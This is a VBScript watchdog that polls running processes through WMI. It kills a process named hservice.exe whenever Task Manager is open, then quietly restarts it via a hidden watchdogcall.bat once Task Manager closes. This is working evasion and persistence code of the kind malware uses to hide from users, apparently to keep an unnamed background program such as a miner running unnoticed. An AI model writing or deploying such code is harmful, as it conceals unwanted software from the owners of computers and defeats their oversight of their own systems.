Set objArgs = WScript.Arguments
strProcess = "hservice.exe"
taskmgrProcess = "taskmgr.exe"
strComputer = "."
Set objShell = WScript.CreateObject("WScript.Shell")
Dim flag
flag = 1

Do
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name ='" & strProcess & "'")
    Set taskmgrcolProcess = objWMIService.ExecQuery("Select * from Win32_Process Where Name ='" & taskmgrProcess & "'")

    If flag = 0 AND colProcesses.Count = 0 Then
        objShell.Run("watchdogcall.bat"), 0, True
        WScript.Sleep 500

    ElseIf taskmgrcolProcess.Count = 0 Then
        flag=0
        WScript.Sleep 500

    Else
        flag=1
        For Each objProcess in colProcesses
                objProcess.Terminate()
        Next
        WScript.Sleep 500

    End If
Loop